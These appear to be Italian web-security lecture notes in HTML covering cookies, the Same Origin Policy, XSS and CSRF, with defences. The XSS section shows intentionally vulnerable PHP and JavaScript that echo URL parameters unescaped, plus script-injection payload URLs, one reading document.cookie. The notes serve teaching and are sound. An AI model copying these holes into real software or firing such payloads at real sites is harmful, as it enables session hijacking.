+<p>È possibile <strong>creare ed eliminare i cookie in JavaScript</strong> modificando <code>document.cookie</code>. Per eliminare un cookie, si imposta la sua data di scadenza nel passato.</p>
+<p><strong>È possibile avere due cookie con lo stesso nome ma percorsi diversi.</strong> Se i percorsi non sono disgiunti, entrambi i cookie vengono inviati al server e il modo in cui il server gestisce i cookie con lo stesso nome dipende dal linguaggio di programmazione, dal framework o dalla libreria utilizzata.</p>
+<p>Alcuni linguaggi, come Java, JavaScript e Go, leggono i cookie come una <strong>lista</strong>, mentre altri, come PHP, Python e Node.js, usano un <strong>dizionario</strong>, rendendo imprevedibile quale dei due cookie verrà utilizzato.</p>
+<p>Lo stato della sessione può essere memorizzato sul server o sul client.</p>
+<ul>
+<li>I <strong>server con stato</strong> utilizzano un cookie <code>secure</code> e <code>HttpOnly</code> nel browser del client ma mantengono lo stato nel server. Questo approccio può comportare un sovraccarico eccessivo lato server.</li>
+<li>I <strong>server senza stato</strong> crittografano i dati di sessione insieme a un ID utente e un timestamp utilizzando una chiave del server. Memorizzano il blob crittografato in un cookie nel browser del client, nel server viene solo mantenuto un timestamp di login o logout per validare il blob quando viene ricevuto dal client.</li>
+</ul>
+<h2 id="sop">SOP</h2>
+<p>Un browser permette di navigare più siti contemporaneamente, per fornire un adeguato isolamento tra le varie pagine web aperte nello stesso browser si implementa la SOP.</p>
+<p>La <strong>Same Origin Policy (SOP)</strong> è una politica di sicurezza standard dei browser che limita l’accesso tra documenti o script caricati da domini diversi.</p>
+<p><img src="https://i.ibb.co/gZF4Wcf/image.png" alt="https://i.ibb.co/gZF4Wcf/image.png"></p>
+<p>Due pagine hanno la <strong>stessa origine</strong> se il <strong>protocollo, la porta e l’host</strong> sono gli stessi per entrambe le pagine.</p>
+<p>Ad esempio con la pagina  <code>http://store.company.com/dir/page.html</code></p>
+<pre><code>http://store.company.com/dir2/other.html  OK stessa origine
+http://store.company.com/dir/in/pag.html  OK stessa origine
+https://store.company.com/secure.html     NO protocollo diverso
+http://store.company.com:81/dir/etc.html  NO porta diversa
+http://news.company.com/dir/other.html    NO host diverso
+</code></pre>
+<p>Se l’origine è diversa (si ha <em>cross-origin</em>), SOP limita o vieta:</p>
+<ul>
+<li>l’accesso alla rete</li>
+<li>script API</li>
+<li>l’archiviazione dei dati e i cookie.</li>
+</ul>
+<h3 id="accesso-alla-rete">Accesso alla rete</h3>
+<p>Le <strong>scritture cross-origin</strong> sono in genere <strong>consentite</strong>, si tratta di inviare dati verso un’altra origine senza aspettarsi di ricevere risposta (seguire un link, il reindirizzamento e l’invio di un form).</p>
+<p>L’<strong>embedding cross-origin</strong> è in genere <strong>consentito</strong>, si tratta di inserire risorse di un’altra origine nella pagina corrente per scopi di visualizzazione o funzionalità (immagini, CSS e JavaScript).</p>
+<p>Le <strong>letture cross-origin</strong>, sono in genere <strong>vietate</strong>, si tratta di cercare di accedere o leggere il contenuto di una risorsa da un’altra origine (usare <code>fetch</code> per ottenere dati JSON da un’API su un dominio diverso e leggere la risposta).</p>
+<h3 id="script-api">Script API</h3>
+<p>Alcune API JavaScript consentono ai documenti di fare riferimento l’uno all’altro, ma l’accesso è limitato se i due documenti hanno origine diversa.</p>
+<p>Questa restrizione può essere allentata modificando <code>document.domain</code>, utile quando le pagine web appartenenti a sottodomini diversi devono comunicare.</p>
+<p><img src="https://i.ibb.co/S6bY39h/image.png" alt="https://i.ibb.co/S6bY39h/image.png"></p>
+<h3 id="archiviazione-e-cookie">Archiviazione e cookie</h3>
+<p>Ogni origine ha il proprio spazio di archiviazione.</p>
+<p>Per i cookie, il protocollo è facoltativo e viene considerato il path invece della porta, quindi l’origine viene identificata da <strong>Protocol, host e path</strong>.</p>
+<h1 id="xss-e-csrf">XSS e CSRF</h1>
+<p>Il <strong>Cross-Site Scripting</strong> (XSS) è un attacco di <strong>injection di codice all’interno di pagine web</strong> che può portare a:</p>
+<ul>
+<li>leak di informazioni sensibili</li>
+<li>controllo dell’applicazione</li>
+<li>il dirottamento della sessione</li>
+</ul>
+<p>Il codice iniettato viene <strong>eseguito nel browser della vittima</strong>. XSS bypassa la <em>Same Origin Policy</em> (SOP), consentendo al codice iniettato di accedere direttamente a qualsiasi informazione della pagina vulnerabile, inclusi i cookie di sessione.</p>
+<p><img src="https://i.ibb.co/5K2rm4V/image.png" alt="https://i.ibb.co/5K2rm4V/image.png"></p>
+<p>Esistono tre tipi di vulnerabilità XSS che differiscono in base a come viene iniettato il codice e se esso è persistente o meno:</p>
+<ul>
+<li><strong>Reflected XSS</strong></li>
+<li><strong>Stored XSS</strong></li>
+<li><strong>DOM-based XSS</strong></li>
+</ul>
+<h2 id="reflected-xss">Reflected XSS</h2>
+<p>Assumiamo che la pagina web mandi una richiesta al server incorporando l’input dell’utente come parte della richiesta, il server risponde inviando una pagina html in cui ha inserito l’input dell’utente.</p>
+<p>Se l’input inserito dall’utente contiene del codice (ad esempio uno script JavaScript) allora quando il client riceve la risposta dal server, la nuova pagina html conterrà tale script che verrà eseguito sulla sua macchina.</p>
+<p>Un esempio tipico in cui si può verificare questo attacco è il seguente:</p>
+<ul>
+<li>la vittima riceve una mail di phishing e clicca su un link verso una pagina vulnerabile a XSS: su tale link l’attaccante ha scritto anche lo script javascript</li>
+<li>quando la vittima clicca sul link, il server gli risponde con una pagina html contenente lo script malevolo dell’attaccante</li>
+<li>quando il browser renderizza la pagina html ricevuta, lo script malevolo viene eseguito</li>
+</ul>
+<h3 id="esempio-pratico">Esempio pratico</h3>
+<p>Immaginiamo di avere questo file <code>.php</code> che stampa a schermo i parametri <code>name</code> e <code>surname</code> ottenuti da una richiesta GET (sull’URL).</p>
+<pre class=" language-php"><code class="prism  language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
+<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"X-XSS-Protection: 0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">session_name</span><span class="token punctuation">(</span><span class="token string">"SESSID1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token string">"Welcome, "</span> <span class="token punctuation">.</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'surname'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?&gt;</span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span>
+
+</code></pre>
+<p>quindi alla seguente richiesta: <code>http://localhost/greet.php?name=Mario%20&amp;surname=Rossi</code></p>
+<p>otteniamo la seguente pagina web</p>
+<p><img src="https://i.ibb.co/7zPvK4L/image.png" alt="https://i.ibb.co/7zPvK4L/image.png"></p>
+<p>Supponiamo che l’attaccante costruisca un link di questo tipo:</p>
+<p><code>http://localhost/greet.php?name=&lt;script&gt;alert("this come from injected code")&lt;/script&gt;</code></p>
+<p>se la vittima clicca su questo link otterrà la seguente pagina web:</p>
+<p><img src="https://i.ibb.co/ZW408jk/image.png" alt="https://i.ibb.co/ZW408jk/image.png"></p>
+<p>Logicamente dentro <code>&lt;script&gt;…&lt;/script&gt;</code> l’attaccante può mettere ciò che vuole, ad esempio ottenere il cookie dell’utente (se non è flaggato con <code>HttpOnly</code>).</p>
+<p>Per nascondere la reale struttura dei link, gli attaccanti possono usare degli <strong>URL shortener</strong>, per cui quando si incontrano link generati da questi shortener bisogna prestare molta attenzione.</p>
+<h2 id="stored-xss">Stored XSS</h2>
+<p>Si verifica quando un’applicazione web memorizza l’input utente inviato al server e lo visualizza in una qualche pagina web, ad esempio un post in un forum.</p>
+<p>Se l’input contiene codice dannoso, questo verrà eseguito ogni volta che un utente visita la pagina infetta.</p>
+<h2 id="dom-based-xss"><strong>DOM-based XSS</strong></h2>
+<p>Simile a reflected XSS, ma lo script non viene aggiungo alla pagina html durante la sua creazione nel server ma avviene lato client a causa di script esistenti sul client che ad esempio processano i parametri dell’URL per fare delle azioni.</p>
+<h3 id="esempio-pratico-1">Esempio pratico</h3>
+<p>Immaginiamo di avere questo file <code>.html</code> che contiene uno script JavaScript che crea il primo elemento di un campo <code>&lt;select&gt;&lt;/select&gt;</code> in modo dinamico leggendo il parametro <code>default</code> nell’URL:</p>
+<pre class=" language-html"><code class="prism  language-html">Select your language:
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span><span class="token punctuation">&gt;</span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script language-javascript">
+		document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>
+			<span class="token string">"&lt;OPTION value=1&gt;"</span>
+			<span class="token operator">+</span> <span class="token function">decodeURI</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>
+			document<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"default="</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+			<span class="token operator">+</span> <span class="token string">"&lt;/OPTION&gt;"</span>
+		<span class="token punctuation">)</span><span class="token punctuation">;</span>
+		document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"&lt;OPTION value=2&gt;English&lt;/OPTION&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">&gt;</span></span>
+</code></pre>
+<p>Una richiesta innocente è la seguente <code>http://localhost/page.html?default=Franch</code> che genera la seguente pagina:</p>
+<p><img src="https://i.ibb.co/Z89wQr4/image.png" alt="https://i.ibb.co/Z89wQr4/image.png"></p>
+<p>Mentre una richiesta malevola può essere la seguente <code>http://localhost/page.html?default=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code> che genera la seguente pagina</p>
+<p><img src="https://i.ibb.co/r3x9YfQ/image.png" alt="https://i.ibb.co/r3x9YfQ/image.png"></p>
+<h2 id="prevenire-attacchi-xss"><strong>Prevenire attacchi XSS</strong></h2>
+<p>Per prevenire attacchi XSS è importante fare:</p>
+<ul>
+<li><strong>Validazione dell’output:</strong> codificare i caratteri HTML (ad esempio, con <code>htmlspecialchars</code> in PHP) ed evitare di inserire input esterni direttamente dentro script JS.</li>
+<li><strong>Validazione dell’input:</strong> consentire solo ciò che ci si aspetta in termini di lunghezza, caratteri e corrispondenza con le espressioni regolari. Utilizzare delle <em>whitelist</em> sull’input quando possibile.</li>
+</ul>
+<p>controllare la presenza di “</p><p>Sono inoltre molto importanti le seguenti pratiche:</p>
+<ul>
+<li><strong>Mettere il flag</strong> <code>HttpOnly</code> <strong>ai cookie:</strong> impediscono agli script JS di leggere i cookie di sessione, proteggendoli dagli attacchi XSS.</li>
+<li><strong>Content Security Policy (CSP):</strong> specifica i domini fidati per gli script e può disabilitare gli script inline.</li>
+<li><strong>XSS Auditor</strong> (ormai deprecato)<strong>:</strong> blocca il codice nella pagina web che appare anche nella richiesta, mitigando gli attacchi XSS reflected.</li>
+</ul>
+<h2 id="csrf">CSRF</h2>
+<p><strong>Cross-Site Request Forgery (CSRF)</strong> è un attacco in cui l’attaccante crea richieste dannose per un’applicazione web in cui <strong>l’utente è attualmente autenticato</strong>.</p>
+<p>Il punto cruciale è che i siti web non possono distinguere se le richieste provenienti da utenti già autenticati siano state originate da un’interazione esplicita dell’utente o meno.</p>
+<p>CSRF è un attacco di integrità e <strong>non è bloccato dalla Same Origin Policy (SOP).</strong></p>
+<p><strong>Scenario tipico di un attacco CSRF:</strong></p>
+<p><img src="https://i.ibb.co/BKkJhs2/image.png" alt="https://i.ibb.co/BKkJhs2/image.png"></p>
+<ul>
+<li>Un utente è autenticato su un’applicazione web, ad esempio il suo sito di banking online.</li>
+<li>L’utente clicca su un link su un altro sito malevolo.</li>
+<li>Il sito web malevolo fa partire una richiesta dal browser verso all’applicazione web vulnerabile, ad esempio per effettuare un bonifico.</li>
+<li>Il browser dell’utente invia la richiesta all’applicazione web, includendo i cookie di autenticazione.</li>
+<li>L’applicazione web elabora la richiesta, credendo che provenga dall’utente in quanto esso è già autenticato dal cookie, ed esegue l’operazione.</li>
+</ul>
+<h2 id="prevenire-attacchi-csrf"><strong>Prevenire attacchi</strong> CSRF</h2>
+<p>Diverse tecniche possono essere utilizzate per prevenire gli attacchi CSRF:</p>
+<ul>
+<li>
+<p><strong>Token anti-CSRF:</strong> un valore casuale associato alla sessione dell’utente e rigenerato a ogni richiesta. Il token è nascosto in ogni form e, quando il form viene inviato, il token viene confrontato con quello corrente. L’operazione è consentita solo se corrispondono.</p>
+<p>Il token anti-CSRF può anche essere salvato in un cookie del browser (variante <em>stateless</em>).</p>
+<p><img src="https://i.ibb.co/C9VR8tY/image.png" alt="https://i.ibb.co/C9VR8tY/image.png"></p>
+</li>
+<li>
+<p><strong>Uso degli header</strong> <code>Origin</code> ****e <code>Referer</code>: l’header <code>Origin</code> è stato introdotto specificamente per prevenire CSRF, contenendo solo l’origine e non informazioni sensibili. Il server può verificare che l’origine corrisponda a quella prevista. Se <code>Origin</code> non è presente, è possibile controllare il <code>Referer</code>.</p>
+<p><img src="https://i.ibb.co/bBbq0tB/image.png" alt="https://i.ibb.co/bBbq0tB/image.png"></p>
+</li>
+<li>
+<p><strong>Uso di header personalizzati:</strong> ad esempio per le richieste AJAX, si può verificare la presenza dell’header <code>X-Requested-With</code> con valore <code>XMLHttpRequest</code>. Questo funziona perché tale header non è impostabile da origini diverse da quella originale.</p>
+</li>
+<li>
+<p><strong>Interazione dell’utente:</strong> per operazioni critiche, come i operazioni bancarie, è consigliabile richiedere un’<strong>interazione esplicita dell’utente</strong> come: ri-autenticazione, l’utilizzo di <em>One-Time Password</em> o l’inserimento di input extra (ad esempio, CAPTCHA).</p>
+<p>L’attaccante non sarà in grado di risolvere questi controlli prima di effettuare la richiesta e quindi non riuscirà nel suo intento.</p>
+</li>
+</ul>
+
+    </div>
+  </div>
+</body>
+
+</html>
